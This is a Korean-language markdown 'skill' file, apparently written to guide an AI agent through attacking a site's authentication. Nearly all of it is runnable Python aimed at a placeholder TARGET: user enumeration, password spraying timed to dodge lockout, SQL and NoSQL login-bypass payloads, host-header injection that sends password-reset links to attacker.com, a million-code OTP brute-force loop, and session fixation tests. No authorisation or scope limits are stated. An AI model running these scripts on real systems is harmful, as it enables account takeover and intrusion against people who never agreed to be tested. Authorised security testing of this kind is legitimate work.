# SKILL: Authentication Attack

## 목적
로그인/인증 시스템의 모든 취약점 탐지.
단순 브루트포스부터 SSO 우회, MFA 우회, 세션 탈취까지 포함.

---

## PHASE 1: 계정 열거 (공격 전 필수)

```python
import httpx, time

client = httpx.Client(verify=False, timeout=10, follow_redirects=True)
login_url = "https://TARGET/login"

# 기준선 (존재하지 않는 계정)
r = client.post(login_url, data={"username": "BINGO_NO_EXIST_999", "password": "wrong"})
baseline_len = len(r.text)
baseline_msg = r.text[:200]

# 테스트할 사용자명
candidates = ["admin", "administrator", "root", "test", "user", "info",
              "support", "manager", "guest", "demo", "api", "service"]

valid_users = []
for user in candidates:
    r = client.post(login_url, data={"username": user, "password": "WRONG_PWD_999"})
    diff = abs(len(r.text) - baseline_len)
    
    # 응답 크기가 다르거나 에러 메시지가 다르면 유효한 계정
    if diff > 50:
        valid_users.append(user)
        print(f"[ENUM] Valid user: {user!r} (diff={diff}B)")
    time.sleep(0.3)

print(f"\n[ENUM] Valid users: {valid_users}")
```

---

## PHASE 2: 패스워드 스프레이 (계정 잠금 우회)

```python
# 계정 잠금 우회: 하나의 패스워드로 여러 계정 시도
# 요청 간격을 넓게 → 잠금 카운터 리셋

import httpx, time

spray_passwords = [
    "Password1", "P@ssw0rd", "Winter2024!", "Summer2025!",
    "Company123!", "Welcome1", "Qwer1234!", "Admin@123",
]

for password in spray_passwords:
    print(f"\n[SPRAY] Trying password: {password!r}")
    for username in valid_users:
        r = client.post(login_url, data={"username": username, "password": password})
        if "logout" in r.text.lower() or r.status_code == 302:
            print(f"🔴 [SPRAY] SUCCESS: {username}:{password}")
        time.sleep(1.5)  # 계정 잠금 방지
    time.sleep(30)  # 다음 패스워드 시도 전 대기 (잠금 카운터 리셋)
```

---

## PHASE 3: 로그인 로직 우회

```python
import httpx

client = httpx.Client(verify=False, timeout=10)
login_url = "https://TARGET/login"

# 1. SQL Injection in login form
sqli_payloads = [
    ("admin'-- -", "anything"),
    ("admin' OR '1'='1'-- -", "anything"),
    ("' OR 1=1-- -", "anything"),
    ("admin'/*", "*/-- -"),
    ("1' OR '1'='1", "1' OR '1'='1"),
]
for user, pwd in sqli_payloads:
    r = client.post(login_url, data={"username": user, "password": pwd})
    if r.status_code == 302 or "dashboard" in r.text.lower():
        print(f"[SQLI LOGIN] Bypass: user={user!r}")

# 2. NoSQL Injection (MongoDB)
nosql_payloads = [
    {"username": {"$ne": None}, "password": {"$ne": None}},
    {"username": "admin", "password": {"$regex": ".*"}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
]
import json
for p in nosql_payloads:
    r = client.post(login_url, 
                    content=json.dumps(p),
                    headers={"Content-Type": "application/json"})
    if r.status_code == 200 and "dashboard" in r.text.lower():
        print(f"[NOSQL] Bypass: {p}")

# 3. Type Juggling (PHP 느슨한 비교)
php_bypass = [
    {"username": "admin", "password": "0"},      # "0" == False
    {"username": "admin", "password": True},      # true
    {"username": "admin", "password": []},        # empty array
]
for p in php_bypass:
    try:
        r = client.post(login_url, content=json.dumps(p),
                        headers={"Content-Type": "application/json"})
        print(f"[PHP TYPE] {p} → {r.status_code}")
    except Exception:
        pass
```

---

## PHASE 4: 패스워드 리셋 공격

```python
import httpx, re

client = httpx.Client(verify=False, timeout=10)
base = "https://TARGET"

# 1. 호스트 헤더 인젝션 → 리셋 링크 탈취
r = client.post(f"{base}/forgot-password",
    data={"email": "victim@target.com"},
    headers={"Host": "attacker.com"}  # 리셋 링크가 attacker.com으로 생성됨
)
print(f"[RESET] Host injection: {r.status_code}")

# 2. 리셋 토큰 예측 (짧거나 시간 기반)
# 토큰 패턴 분석
reset_tokens = []
for i in range(3):
    r = client.post(f"{base}/forgot-password", data={"email": f"test{i}@test.com"})
    # 응답에서 토큰 추출 (테스트 환경에서)
    token_match = re.search(r'token[=:]([a-f0-9]+)', r.text)
    if token_match:
        reset_tokens.append(token_match.group(1))
        print(f"[RESET] Token {i}: {token_match.group(1)}")

# 3. 리셋 토큰 재사용 테스트
if reset_tokens:
    r = client.get(f"{base}/reset-password?token={reset_tokens[0]}")
    print(f"[RESET] Token reuse: {r.status_code}")
    r2 = client.get(f"{base}/reset-password?token={reset_tokens[0]}")
    print(f"[RESET] Token reuse again: {r2.status_code}")
    if r2.status_code == 200:
        print("[RESET] VULNERABLE: Token can be reused!")
```

---

## PHASE 5: MFA / 2FA 우회

```python
import httpx, time

client = httpx.Client(verify=False, timeout=10)
base = "https://TARGET"

# 1. OTP 브루트포스 (6자리 = 1,000,000 조합)
# 리밋 없으면 가능
mfa_url = f"{base}/verify-otp"
for code in range(1000000):
    otp = str(code).zfill(6)
    r = client.post(mfa_url, data={"otp": otp, "session": "YOUR_SESSION"})
    if "success" in r.text.lower() or r.status_code == 302:
        print(f"[MFA] OTP cracked: {otp}")
        break
    if code % 10000 == 0:
        print(f"[MFA] Progress: {code}/1000000")
    time.sleep(0.1)

# 2. OTP 코드 재사용 테스트
# 3. 이전 단계(OTP 검증) 직접 스킵
# OTP 검증 없이 다음 페이지 직접 접근
skip_attempts = [
    f"{base}/dashboard",
    f"{base}/account",
    f"{base}/profile",
]
for url in skip_attempts:
    r = client.get(url)
    if r.status_code == 200 and "login" not in r.url.path:
        print(f"[MFA SKIP] Direct access possible: {url}")

# 4. MFA 응답 조작 (Burp Suite 방식 — Python 버전)
# {"success": false} → {"success": true} 응답 조작 시도
```

---

## PHASE 6: 세션 탈취 / 고정

```python
import httpx

client = httpx.Client(verify=False, timeout=10)
base = "https://TARGET"

# 1. 세션 고정 테스트
# 먼저 고정할 세션 ID 설정
r = client.get(f"{base}/login",
               cookies={"PHPSESSID": "BINGO_FIXED_SESSION_123"})
# 로그인 후 세션 ID가 변경되지 않으면 취약
r2 = client.post(f"{base}/login",
                 data={"username": "admin", "password": "password"},
                 cookies={"PHPSESSID": "BINGO_FIXED_SESSION_123"})
if "BINGO_FIXED_SESSION_123" in str(r2.cookies):
    print("[SESSION FIX] VULNERABLE: Session not rotated after login!")

# 2. 로그아웃 후 세션 재사용
r = client.get(f"{base}/logout")
# 세션 ID 재사용 시도
r2 = client.get(f"{base}/dashboard")
if r2.status_code == 200:
    print("[SESSION] VULNERABLE: Session valid after logout!")
```

---

## 체크리스트

- [ ] 계정 열거 가능 여부 (에러 메시지 차이)
- [ ] 브루트포스 보호 없음 (계정 잠금/Rate limit)
- [ ] 로그인 폼 SQLi
- [ ] NoSQL Injection (MongoDB)
- [ ] 패스워드 리셋 — 호스트 헤더 인젝션
- [ ] 패스워드 리셋 토큰 — 예측 가능 / 재사용 가능
- [ ] MFA OTP 브루트포스 가능
- [ ] MFA 우회 (직접 대시보드 접근)
- [ ] 세션 고정
- [ ] 로그아웃 후 세션 재사용
- [ ] Remember Me 토큰 — 예측 가능
